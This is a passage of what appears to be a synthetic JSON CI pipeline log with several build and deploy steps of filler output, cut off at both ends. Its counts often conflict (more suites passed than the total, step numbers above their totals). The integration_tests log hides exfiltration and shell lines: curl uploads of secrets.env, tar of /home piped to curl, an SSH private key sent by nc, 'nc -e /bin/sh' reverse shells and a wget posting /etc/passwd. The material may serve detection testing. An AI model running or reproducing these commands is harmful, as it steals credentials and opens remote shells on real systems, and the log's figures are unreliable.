RUN command\n\u2713 All checks passed\n[12:18:08] DEBUG: Loading configuration\nArtifact downloaded: 45MB\nUploading artifact 'dist' (37 files)\n  PASS: test_db_connect (98ms)\nCoverage: 90% statements, 69% branches\nCompiling utils/app.ts...\nCompleted.\nVerifying...\nOptimizing 97 modules...\nGenerating source maps...\n[12:18:08] DEBUG: Connection pool: 19 active\nCache miss for key-8228\n[12:18:08] DEBUG: Connection pool: 4 active\nBundling vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:08] INFO: Starting build process\n\u2713 Task completed in 2511ms\nCompiling utils/index.js...\nCompiling lib/index.js...\nBundling vendor.css\nStep 14/15: Linting\nSuccess!\nAlready up to date.\nFinished.\nStep 16/17: Deploying\nCache restored successfully (374MB)\nnpm install: resolved 1354 packages\nLayer 5/10: RUN command\nChecking out main branch\nUsing Node.js 20.9.1\nGenerating source maps...\nnpm notice: package.json updated\nMinifying vendor.js\nCompiling utils/app.ts...\n[12:18:08] DEBUG: Memory usage: 1271MB\nGenerating source maps...\n[12:18:08] INFO: Connecting to database\nInstalling jest@5.9.8\nStep 4/19: Running migrations\nPOST /api - 202 (385ms)\nBuilding Docker image...\nInstalling webpack@2.20.4\n[12:18:08] INFO: Connecting to database\nVerifying...\nCompleted.\nCompiling utils/service.java...\npip: Collecting express\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCreating production build...\n\u2713 Task completed in 1973ms\nCompiling lib/utils.go...\nTest Suites: 43 passed, 13 total\nPlatform: darwin-arm64\nBundling vendor.css\n[12:18:08] INFO: Cache refreshed\n[12:18:08] DEBUG: Query executed in 48ms\nFetching submodules...\n[12:18:08] DEBUG: Loading configuration\nException: TypeError\nConnecting to cloud.services:443...\n[12:18:08] INFO: Processing request\nUsing Node.js 15.3.7\nException: RuntimeError\n\u2713 test completed\nCache hit for key-8902\nStep 10/25: Testing\nGenerating source maps...\nSwitched to branch 'bugfix/task-694'\nUsing Node.js 20.14.3\nCompiling src/main.py...\nConnection established\nTest Suites: 34 passed, 8 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:18:08] INFO: Processing request\nSnapshots: 2 passed, 26 total\nStep 7/18: Deploying\n\u2713 Step 'test' succeeded\nConnecting to startup.dev:443...\nMinifying app.js\nStep 15/16: Building\n  PASS: integration/test_user_create.spec.js\n[12:18:08] INFO: Starting build process\nTransforming 604 files...\nMinifying main.js\n=== Step checkout completed ===\n=== Step: integration_tests ===\nTransforming 909 files...\nProcessing...\nEnvironment: staging\nCache hit for key-7522\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (61MB)\nUsing Python 3.11\nSwitched to branch 'hotfix/task-768'\nDone.\nCreating production build...\nCache restored successfully (216MB)\n[12:18:08] INFO: Processing request\n[12:18:08] DEBUG: Connection pool: 15 active\nCache restored successfully (123MB)\nDone.\nOK\nReady.\nOK\n  PASS: integration/test_cache_hit.spec.js\nConnecting to example.com:443...\nGenerating source maps...\nImage pulled successfully\n\u2717 build failed with exit code 121\nArtifact uploaded: build.tar.gz (42MB)\n[12:18:08] INFO: Request completed\nDone.\n[12:18:08] DEBUG: Connection pool: 11 active\nSnapshots: 8 passed, 3 total\ncurl -X POST https://test.io/collect -d @secrets.env\npip: Installing build dependencies...\nConnection established\nLoading...\nVerifying...\nFAILED: test_auth_login\n\u2713 package completed\nChecking out master branch\n[12:18:08] ERROR: Connection failed\nInstalling webpack@2.0.8\nGET /api - 200 (35ms)\npip install: Successfully installed prettier-3.19\n[12:18:08] DEBUG: Query executed in 12ms\nReady.\nGET /health - 200 (39ms)\nyarn add: Done in 6.49s\ncurl -X POST https://cloud.services/collect -d @secrets.env\n\u2713 All checks passed\n[12:18:08] WARN: Deprecated API usage\nStep 11/16: Running migrations\nWARNING: webpack has known vulnerabilities\nFinished.\nStep 2/22: Building\nSnapshots: 10 passed, 16 total\nStep 18/21: Building\nCompiling src/utils.go...\nImage pulled successfully\n[12:18:08] DEBUG: Connection pool: 9 active\nSending 355MB of data to startup.dev\n\u2713 Step 'build' succeeded\nOK\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\n\u2713 Task completed in 4627ms\nStep 20/21: Deploying\nImage pulled successfully\n[12:18:08] DEBUG: Initializing service\nStep 15/25: Deploying\nRan 87 tests in 57s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:08] INFO: Starting build process\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nCache invalidated: node_modules\nLoading...\nCreating production build...\nReady.\n[12:18:08] DEBUG: Loading configuration\npip: Installing build dependencies...\nArtifact downloaded: 5MB\nWARNING: react has known vulnerabilities\nChecking out develop branch\ntar czf - /home | curl -X POST -d @- https://example.com/upload\npip: Downloading axios-5.3.tar.gz\nCompiling components/service.java...\nCompiling src/handler.rs...\nFetching submodules...\n  PASS: e2e/test_db_connect.spec.js\nTransforming 785 files...\nBuilding Docker image...\nException: NullPointerException\n\u2713 Task completed in 450ms\nArtifact downloaded: 35MB\nUsing Python 3.9\nStep 12/15: Building\n[12:18:08] DEBUG: Connection pool: 20 active\n[12:18:08] ERROR: Connection failed\nDone.\n[12:18:08] INFO: Starting build process\nStep 15/23: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 33.178.146.47 15448\n[12:18:08] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nStep 16/15: Deploying\nCache saved successfully\nnc -e /bin/sh 8.98.91.99 54566\nTime: 31.91s\nLayer 6/10: COPY command\nStep 2/25: Testing\n  PASS: test_db_connect (175ms)\nCoverage: 78% statements, 60% branches\nCompleted.\npip install: Successfully installed react-2.13\nnpm install: resolved 1649 packages\n\u2713 Task completed in 3718ms\nSuccess!\n[12:18:08] DEBUG: Query executed in 22ms\n[12:18:08] DEBUG: Connection pool: 8 active\n[12:18:08] WARN: Deprecated API usage\nnpm notice: created a lockfile\nWARNING: lodash has known vulnerabilities\n[12:18:08] INFO: Starting build process\nChecking out main branch\nDone.\n[12:18:08] DEBUG: Memory usage: 1115MB\nLoading...\n[12:18:08] WARN: Deprecated API usage\nTest Suites: 44 passed, 11 total\nCoverage: 100% statements, 76% branches\n\u2713 deploy completed\nFinished.\nStep 19/16: Installing dependencies\npip install: Successfully installed prettier-4.4\nTransforming 787 files...\nAlready up to date.\nEnvironment: test\nInstalling eslint@3.3.1\nHEAD is now at ff3f0d8\n\u2717 build failed with exit code 40\nyarn add: Done in 11.91s\nCache hit for key-3975\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nImage pulled successfully\nCompleted.\nStep 11/25: Deploying\nFinished.\n[12:18:08] INFO: Starting build process\n[12:18:08] INFO: Processing request\nArtifact downloaded: 13MB\nStep 11/20: Testing\n[12:18:08] INFO: Request completed\nStep 4/24: Testing\nnc -e /bin/sh 174.139.234.159 24795\nPulling image: node:latest\nTests: 289 passed, 352 total\nFinished.\nSnapshots: 49 passed, 29 total\nUsing Python 3.9\n[12:18:08] INFO: Starting build process\n[12:18:08] INFO: Request completed\nLayer 7/9: RUN command\nPlatform: linux-x64\n[12:18:08] DEBUG: Memory usage: 1511MB\nDone.\nFinished.\nUploading artifact 'build' (2 files)\nCompiling utils/app.ts...\nCompiling lib/utils.go...\n[12:18:08] WARN: Deprecated API usage\nInstalling express@4.10.8\nTests: 459 passed, 95 total\nCreating production build...\n[12:18:08] ERROR: Connection failed\nCompleted.\n[12:18:08] INFO: Connecting to database\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\ncurl -X POST https://acme.corp/collect -d @secrets.env\nVerifying...\n[12:18:08] DEBUG: Connection pool: 5 active\nTest Suites: 15 passed, 9 total\nWARNING: jest has known vulnerabilities\npip: Downloading react-1.16.tar.gz\nSuccess!\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nWARNING: react has known vulnerabilities\nSuccess!\nDone.\nPOST /api - 202 (484ms)\nCompiling components/main.py...\n[12:18:08] DEBUG: Loading configuration\nInstalling react@2.4.6\n[12:18:08] DEBUG: Loading configuration\nnpm notice: created a lockfile\nSnapshots: 25 passed, 40 total\n[12:18:08] INFO: Processing request\nAlready up to date.\nWARNING: webpack has known vulnerabilities\nBundling main.css\nSnapshots: 37 passed, 9 total\nConnecting to test.io:443...\n[12:18:08] INFO: Processing request\nMinifying app.js\nnpm notice: created a lockfile\nStep 11/19: Deploying\n\u2717 build failed with exit code 11\nStep 1/19: Testing\nSwitched to branch 'feature/task-461'\nCompiling components/service.java...\nBuilding Docker image...\n=== Step integration_tests completed ===",
    "steps": [
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-28T12:18:08.162312",
        "finished_at": "2025-11-28T12:18:44.456434",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Using Python 3.11",
          "POST /data - 202 (65ms)",
          "Waiting...",
          "Cache restored successfully (405MB)",
          "Installing lodash@2.20.1",
          "Cache invalidated: dependencies",
          "Pushing to registry...",
          "Cache invalidated: build",
          "[12:18:08] WARN: Deprecated API usage",
          "  PASS: e2e/test_api_health.spec.js",
          "Installing express@1.20.4",
          "  PASS: unit/test_auth_login.spec.js",
          "pip install: Successfully installed jest-2.11",
          "Checking out develop branch",
          "Ran 149 tests in 50s",
          "Success!",
          "yarn add: Done in 24.41s",
          "Done.",
          "\u2713 package completed",
          "[12:18:08] DEBUG: Memory usage: 930MB",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Layer 2/14: COPY command",
          "Finished.",
          "Using Python 3.9",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:08] INFO: Request completed",
          "pip: Downloading jest-4.20.tar.gz",
          "pip: Collecting prettier",
          "Transforming 834 files...",
          "Loading...",
          "Connecting to example.com:443...",
          "pip: Downloading lodash-1.16.tar.gz",
          "Checking out master branch",
          "Switched to branch 'hotfix/task-328'",
          "Ran 157 tests in 3s",
          "Compiling src/service.java...",
          "Finished.",
          "Switched to branch 'bugfix/task-599'",
          "WARNING: prettier has known vulnerabilities",
          "npm install: resolved 1958 packages",
          "Optimizing 96 modules...",
          "Tests: 473 passed, 485 total",
          "Compiling utils/utils.go...",
          "Compiling lib/app.ts...",
          "[12:18:08] ERROR: Connection failed",
          "yarn add: Done in 19.58s",
          "pip: Collecting axios",
          "pip install: Successfully installed eslint-3.15",
          "TLS handshake completed",
          "[12:18:08] INFO: Request completed",
          "Step 18/24: Building",
          "npm install: added 406 packages",
          "Step 19/20: Building",
          "Processing...",
          "Ready.",
          "npm install: added 92 packages",
          "[12:18:08] DEBUG: Query executed in 54ms",
          "[12:18:08] DEBUG: Connection pool: 10 active",
          "  PASS: e2e/test_db_connect.spec.js",
          "pip: Installing build dependencies...",
          "pip: Downloading prettier-3.13.tar.gz",
          "[12:18:08] INFO: Connecting to database",
          "Artifact downloaded: 13MB",
          "Verifying...",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (73MB)",
          "pip: Downloading axios-4.11.tar.gz",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:18:08] DEBUG: Query executed in 58ms",
          "yarn add: Done in 10.22s",
          "\u2713 All checks passed",
          "Loading...",
          "[12:18:08] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: added 170 packages",
          "Step 19/25: Deploying",
          "npm notice: created a lockfile",
          "Pulling image: node:3.11",
          "POST /data - 201 (336ms)",
          "Pulling image: node:latest",
          "Layer 7/14: COPY command",
          "Connecting to acme.corp:443...",
          "pip install: Successfully installed axios-3.12",
          "Transforming 938 files...",
          "[12:18:08] INFO: Connecting to database",
          "Compiling src/handler.rs...",
          "Step 3/15: Deploying",
          "Switched to branch 'feature/task-716'",
          "Installing prettier@1.19.9",
          "Artifact uploaded: build.tar.gz (20MB)",
          "  PASS: e2e/test_cache_hit.spec.js",
          "yarn add: Done in 25.41s",
          "Fetching submodules...",
          "Verifying...",
          "[12:18:08] INFO: Processing request",
          "Checking out master branch",
          "Snapshots: 12 passed, 29 total",
          "Cache saved successfully",
          "Compiling components/handler.rs...",
          "Waiting...",
          "[12:18:08] DEBUG: Query executed in 40ms",
          "NODE_ENV=development",
          "Step 8/20: Deploying",
          "Cache hit for key-7468",
          "Processing...",
          "Checking out develop branch",
          "GET /status - 200 (69ms)",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "[12:18:08] INFO: Request completed",
          "  PASS: test_db_connect (13ms)",
          "[12:18:08] ERROR: Connection failed",
          "Artifact downloaded: 6MB",
          "Cache restored successfully (419MB)",
          "[12:18:08] WARN: Deprecated API usage",
          "Artifact downloaded: 28MB",
          "Ran 183 tests in 54s",
          "\u2713 deploy completed",
          "HEAD is now at 0fe430b",
          "NODE_ENV=test",
          "[12:18:08] INFO: Starting build process",
          "Test Suites: 27 passed, 26 total",
          "TLS handshake completed",
          "Cache hit for key-1911",
          "Snapshots: 17 passed, 6 total",
          "Checking out develop branch",
          "Pushing to registry...",
          "WARNING: eslint has known vulnerabilities",
          "Step 20/24: Building",
          "Pulling image: alpine:18",
          "Compiling lib/app.ts...",
          "[12:18:08] DEBUG: Loading configuration",
          "Completed.",
          "Uploading artifact 'dist' (19 files)",
          "[12:18:08] INFO: Connecting to database",
          "Test Suites: 44 passed, 36 total",
          "[12:18:08] WARN: Deprecated API usage",
          "Installing lodash@5.4.10",
          "[12:18:08] DEBUG: Query executed in 19ms",
          "[12:18:08] WARN: Deprecated API usage",
          "Ran 135 tests in 40s",
          "[12:18:08] INFO: Request completed",
          "Time: 5.970s",
          "Using Node.js 18.9.10",
          "WARNING: lodash has known vulnerabilities",
          "GET /status - 204 (66ms)",
          "Coverage: 92% statements, 68% branches",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_db_connect (483ms)",
          "pip install: Successfully installed lodash-5.20",
          "HEAD is now at 8e52854",
          "Optimizing 34 modules...",
          "OK",
          "npm notice: created a lockfile",
          "Step 1/22: Deploying",
          "npm notice: created a lockfile",
          "Step 2/19: Installing dependencies",
          "[12:18:08] WARN: Deprecated API usage",
          "[12:18:08] ERROR: Connection failed",
          "Using Node.js 16.13.9",
          "[12:18:08] DEBUG: Query executed in 58ms",
          "[12:18:08] DEBUG: Query executed in 76ms",
          "WARNING: prettier has known vulnerabilities",
          "Completed.",
          "\u2713 All checks passed",
          "Done.",
          "Minifying vendor.js",
          "Connection established",
          "Waiting...",
          "Pulling image: python:latest",
          "[12:18:08] INFO: Cache refreshed",
          "[12:18:08] INFO: Request completed",
          "[12:18:08] DEBUG: Initializing service",
          "Compiling src/main.py...",
          "WARNING: prettier has known vulnerabilities",
          "[12:18:08] DEBUG: Memory usage: 673MB",
          "Verifying...",
          "Generating source maps...",
          "npm notice: package.json updated",
          "Optimizing 97 modules...",
          "Test Suites: 44 passed, 27 total",
          "[12:18:08] DEBUG: Memory usage: 571MB",
          "Compiling utils/app.ts...",
          "Done.",
          "Time: 15.198s",
          "Step 10/16: Testing",
          "Verifying...",
          "[12:18:08] DEBUG: Query executed in 51ms",
          "Cache invalidated: dependencies",
          "Creating production build...",
          "Uploading artifact 'coverage' (39 files)",
          "[12:18:08] WARN: Deprecated API usage",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-28T12:18:44.456434",
        "finished_at": "2025-11-28T12:18:51.715258",
        "log_lines": [
          "=== Step: restore_cache ===",
          "[12:18:08] WARN: Deprecated API usage",
          "Finished.",
          "Uploading artifact 'coverage' (1 files)",
          "Cache invalidated: dependencies",
          "Minifying app.js",
          "Step 6/21: Building",
          "Step 20/18: Building",
          "Artifact downloaded: 15MB",
          "Ready.",
          "FAILED: test_api_health",
          "WARNING: eslint has known vulnerabilities",
          "[12:18:08] INFO: Starting build process",
          "Minifying app.js",
          "[12:18:08] INFO: Connecting to database",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Downloading eslint-4.1.tar.gz",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling components/main.py...",
          "Cache hit for key-6617",
          "\u2713 Step 'build' succeeded",
          "Platform: win32-x64",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Time: 106.817s",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:18:08] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "  PASS: unit/test_user_create.spec.js",
          "FAILED: test_db_connect",
          "Step 2/22: Building",
          "Artifact uploaded: dist.zip (25MB)",
          "Installing lodash@5.18.4",
          "Processing...",
          "npm install: resolved 274 packages",
          "Layer 8/10: RUN command",
          "[12:18:08] WARN: Deprecated API usage",
          "GET /api - 204 (88ms)",
          "Optimizing 21 modules...",
          "Loading...",
          "[12:18:08] DEBUG: Initializing service",
          "Compiling utils/handler.rs...",
          "Cache invalidated: build",
          "[12:18:08] DEBUG: Connection pool: 17 active",
          "Step 12/20: Running migrations",
          "Checking out develop branch",
          "[12:18:08] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:08] INFO: Starting build process",
          "Step 2/22: Installing dependencies",
          "Artifact uploaded: build.tar.gz (11MB)",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "WARNING: lodash has known vulnerabilities",
          "[12:18:08] DEBUG: Connection pool: 4 active",
          "Environment: staging",
          "  PASS: test_auth_login (40ms)",
          "\u2717 build failed with exit code 23",
          "Using Python 3.12",
          "Generating source maps...",
          "[12:18:08] DEBUG: Initializing service",
          "Building Docker image...",
          "Creating production build...",
          "Generating source maps...",
          "Step 13/21: Deploying",
          "[12:18:08] INFO: Connecting to database",
          "npm install: added 250 packages",
          "Step 11/22: Installing dependencies",
          "Artifact uploaded: dist.zip (66MB)",
          "Tests: 106 passed, 385 total",
          "Verifying...",
          "\u2713 Step 'checkout' succeeded",
          "Step 1/22: Testing",
          "HEAD is now at d41a15a",
          "[12:18:08] WARN: Deprecated API usage",
          "Completed.",
          "Fetching submodules...",
          "pip: Downloading webpack-1.6.tar.gz",
          "Artifact downloaded: 3MB",
          "Minifying vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Using Python 3.10",
          "\u2713 deploy completed",
          "WARNING: webpack has known vulnerabilities",
          "pip: Downloading express-5.0.tar.gz",
          "Processing...",
          "Creating production build...",
          "\u2713 Task completed in 3429ms",
          "Processing...",
          "Platform: darwin-arm64",
          "pip install: Successfully installed axios-2.12",
          "Installing eslint@4.3.5",
          "yarn add: Done in 5.8s",
          "Environment: development",
          "Layer 5/14: COPY command",
          "WARNING: prettier has known vulnerabilities",
          "Fetching submodules...",
          "Time: 107.83s",
          "FAILED: test_auth_login",
          "Bundling vendor.css",
          "GET /health - 204 (55ms)",
          "[12:18:08] INFO: Request completed",
          "Environment: staging",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:18:08] INFO: Cache refreshed",
          "Using Node.js 17.6.8",
          "  PASS: integration/test_cache_hit.spec.js",
          "Finished.",
          "Optimizing 31 modules...",
          "Loading...",
          "\u2713 Step 'test' succeeded",
          "Cache saved successfully",
          "yarn add: Done in 26.41s",
          "Loading...",
          "Fetching submodules...",
          "Processing...",
          "  PASS: unit/test_db_connect.spec.js",
          "Using Python 3.10",
          "POST /data - 200 (382ms)",
          "Using Node.js 20.8.2",
          "Processing...",
          "Installing express@1.19.5",
          "Compiling src/main.py...",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Snapshots: 31 passed, 40 total",
          "Artifact uploaded: dist.zip (21MB)",
          "Environment: development",
          "TLS handshake completed",
          "Coverage: 99% statements, 99% branches",
          "Pushing to registry...",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Generating source maps...",
          "Pulling image: node:latest",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 Task completed in 2812ms",
          "[12:18:08] ERROR: Connection failed",
          "yarn add: Done in 25.33s",
          "Creating production build...",
          "\u2717 build failed with exit code 116",
          "Step 16/24: Installing dependencies",
          "Bundling main.js",
          "WARNING: lodash has known vulnerabilities",
          "Success!",
          "[12:18:08] DEBUG: Query executed in 69ms",
          "[12:18:08] ERROR: Connection failed",
          "[12:18:08] INFO: Processing request",
          "Installing express@2.11.7",
          "pip: Collecting prettier",
          "[12:18:08] INFO: Processing request",
          "Compiling components/handler.rs...",
          "Using Python 3.12",
          "[12:18:08] INFO: Connecting to database",
          "Connecting to cloud.services:443...",
          "Connection established",
          "Compiling components/service.java...",
          "[12:18:08] INFO: Starting build process",
          "Processing...",
          "[12:18:08] WARN: Deprecated API usage",
          "Optimizing 94 modules...",
          "Pulling image: node:latest",
          "\u2713 deploy completed",
          "WARNING: webpack has known vulnerabilities",
          "pip install: Successfully installed react-5.8",
          "yarn add: Done in 28.18s",
          "Uploading artifact 'dist' (34 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-3586",
          "Using Python 3.11",
          "Done.",
          "Waiting...",
          "Installing axios@1.2.2",
          "OK",
          "[12:18:08] ERROR: Connection failed",
          "Already up to date.",
          "[12:18:08] INFO: Processing request",
          "Platform: win32-x64",
          "Image pulled successfully",
          "Cache hit for key-3198",
          "Compiling components/app.ts...",
          "[12:18:08] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Connecting to test.io:443...",
          "Finished.",
          "Pulling image: node:18",
          "Step 8/19: Deploying",
          "Loading...",
          "\u2713 Step 'setup' succeeded",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-28T12:18:51.715258",
        "finished_at": "2025-11-28T12:18:56.554474",
        "log_lines": [
          "=== Step: deploy_production ===",
          "npm install: resolved 1663 packages",
          "[12:18:08] DEBUG: Query executed in 57ms",
          "Cache invalidated: node_modules",
          "pip: Downloading webpack-2.3.tar.gz",
          "Generating source maps...",
          "[12:18:08] DEBUG: Query executed in 60ms",
          "pip: Downloading jest-3.4.tar.gz",
          "Building Docker image...",
          "Tests: 273 passed, 151 total",
          "Optimizing 97 modules...",
          "WARNING: lodash has known vulnerabilities",
          "Ready.",
          "Completed.",
          "[12:18:08] DEBUG: Connection pool: 2 active",
          "Minifying app.js",
          "Step 19/24: Testing",
          "GET /health - 200 (52ms)",
          "[12:18:08] DEBUG: Query executed in 58ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:18:08] DEBUG: Connection pool: 1 active",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Optimizing 15 modules...",
          "Minifying app.js",
          "npm notice: created a lockfile",
          "FAILED: test_db_connect",
          "[12:18:08] DEBUG: Memory usage: 1639MB",
          "pip: Downloading jest-5.6.tar.gz",
          "  PASS: test_api_health (130ms)",
          "Creating production build...",
          "Time: 12.131s",
          "Verifying...",
          "[12:18:08] INFO: Processing request",
          "Waiting...",
          "Cache hit for key-9465",
          "NODE_ENV=production",
          "pip: Collecting express",
          "WARNING: react has known vulnerabilities",
          "[12:18:08] INFO: Processing request",
          "Connecting to test.io:443...",
          "[12:18:08] INFO: Request completed",
          "Tests: 403 passed, 355 total",
          "Cache restored successfully (440MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Task completed in 4841ms",
          "Step 12/23: Running migrations",
          "npm notice: created a lockfile",
          "Tests: 312 passed, 465 total",
          "TLS handshake completed",
          "Tests: 350 passed, 439 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:08] DEBUG: Query executed in 59ms",
          "Step 16/17: Installing dependencies",
          "Ran 120 tests in 48s",
          "HEAD is now at a5e4b6b",
          "\u2713 Step 'checkout' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:18:08] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching submodules...",
          "Cache saved successfully",
          "Cache restored successfully (114MB)",
          "Ran 32 tests in 25s",
          "npm install: added 438 packages",
          "\u2713 All checks passed",
          "Processing...",
          "[12:18:08] INFO: Cache refreshed",
          "Time: 49.126s",
          "Cache miss for key-8591",
          "OK",
          "[12:18:08] DEBUG: Memory usage: 1868MB",
          "GET /status - 204 (18ms)",
          "Step 12/22: Deploying",
          "Time: 2.141s",
          "[12:18:08] DEBUG: Memory usage: 682MB",
          "Using Python 3.10",
          "Generating source maps...",
          "Using Node.js 20.14.1",
          "Completed.",
          "Artifact uploaded: dist.zip (81MB)",
          "HEAD is now at f942233",
          "npm install: resolved 159 packages",
          "npm install: added 351 packages",
          "Connecting to example.com:443...",
          "Checking out main branch",
          "Fetching submodules...",
          "pip install: Successfully installed prettier-2.11",
          "\u2713 Task completed in 4154ms",
          "Uploading artifact 'build' (15 files)",
          "Loading...",
          "Step 5/18: Building",
          "TLS handshake completed",
          "Environment: production",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:18:08] INFO: Processing request",
          "[12:18:08] WARN: Deprecated API usage",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Building Docker image...",
          "Transforming 252 files...",
          "\u2713 Step 'test' succeeded",
          "Minifying vendor.js",
          "Test Suites: 48 passed, 20 total",
          "Generating source maps...",
          "Success!",
          "TLS handshake completed",
          "[12:18:08] DEBUG: Memory usage: 366MB",
          "Step 8/24: Testing",
          "Fetching submodules...",
          "Loading...",
          "Finished.",
          "\u2713 Step 'checkout' succeeded",
          "  PASS: unit/test_user_create.spec.js",
          "[12:18:08] INFO: Request completed",
          "OK",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:18:08] WARN: Deprecated API usage",
          "Fetching submodules...",
          "[12:18:08] INFO: Starting build process",
          "Cache miss for key-3436",
          "Exception: RuntimeError",
          "[12:18:08] DEBUG: Loading configuration",
          "[12:18:08] DEBUG: Loading configuration",
          "Fetching submodules...",
          "[12:18:08] INFO: Cache refreshed",
          "\u2713 All checks passed",
          "[12:18:08] DEBUG: Query executed in 81ms",
          "[12:18:08] INFO: Cache refreshed",
          "[12:18:08] INFO: Connecting to database",
          "Cache hit for key-5653",
          "Transforming 625 files...",
          "Installing axios@2.17.2",
          "Compiling utils/app.ts...",
          "Transforming 308 files...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Already up to date.",
          "TLS handshake completed",
          "WARNING: express has known vulnerabilities",
          "Test Suites: 31 passed, 46 total",
          "Finished.",
          "Cache restored successfully (215MB)",
          "Compiling components/app.ts...",
          "Platform: linux-x64",
          "Platform: linux-x64",
          "Compiling components/app.ts...",
          "Layer 8/11: COPY command",
          "Step 13/16: Deploying",
          "Snapshots: 13 passed, 50 total",
          "Cache invalidated: build",
          "[12:18:08] INFO: Cache refreshed",
          "[12:18:08] INFO: Processing request",
          "[12:18:08] WARN: Deprecated API usage",
          "Layer 10/14: COPY command",
          "Verifying...",
          "[12:18:08] DEBUG: Initializing service",
          "Switched to branch 'feature/task-325'",
          "[12:18:08] DEBUG: Connection pool: 5 active",
          "[12:18:08] WARN: Deprecated API usage",
          "Already up to date.",
          "Coverage: 97% statements, 75% branches",
          "NODE_ENV=production",
          "Platform: darwin-arm64",
          "Cache invalidated: node_modules",
          "Step 14/25: Running migrations",
          "[12:18:08] WARN: Deprecated API usage",
          "Already up to date.",
          "NODE_ENV=production",
          "  PASS: unit/test_cache_hit.spec.js",
          "Cache invalidated: node_modules",
          "npm notice: package.json updated",
          "  PASS: e2e/test_auth_login.spec.js",
          "Using Node.js 18.14.7",
          "Waiting...",
          "Using Node.js 17.6.7",
          "npm install: added 167 packages",
          "Step 10/17: Deploying",
          "[12:18:08] INFO: Request completed",
          "[12:18:08] INFO: Processing request",
          "Platform: darwin-arm64",
          "pip install: Successfully installed express-5.15",
          "Step 10/19: Running migrations",
          "Cache invalidated: build",
          "yarn add: Done in 13.54s",
          "pip install: Successfully installed jest-5.9",
          "Step 9/23: Deploying",
          "Exception: TypeError",
          "Step 17/17: Linting",
          "[12:18:08] INFO: Connecting to database",
          "  PASS: e2e/test_cache_hit.spec.js",
          "pip: Downloading react-3.7.tar.gz",
          "Pulling image: node:latest",
          "npm install: resolved 323 packages",
          "WARNING: react has known vulnerabilities",
          "\u2713 All checks passed",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-28T12:18:56.554474",
        "finished_at": "2025-11-28T12:19:08.652515",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:18:08] DEBUG: Memory usage: 1521MB",
          "  PASS: test_user_create (185ms)",
          "\u2713 Task completed in 3803ms",
          "Cache miss for key-4415",
          "  PASS: test_api_health (381ms)",
          "[12:18:08] WARN: Deprecated API usage",
          "[12:18:08] DEBUG: Initializing service",
          "OK",
          "[12:18:08] DEBUG: Loading configuration",
          "WARNING: eslint has known vulnerabilities",
          "Compiling components/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Downloading jest-2.5.tar.gz",
          "Using Node.js 15.16.3",
          "Artifact uploaded: dist.zip (35MB)",
          "[12:18:08] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Tests: 165 passed, 417 total",
          "Done.",
          "Transforming 890 files...",
          "\u2717 build failed with exit code 42",
          "yarn add: Done in 10.32s",
          "Loading...",
          "[12:18:08] DEBUG: Query executed in 63ms",
          "HEAD is now at 5bea4ce",
          "[12:18:08] DEBUG: Query executed in 60ms",
          "  PASS: e2e/test_cache_hit.spec.js",
          "OK",
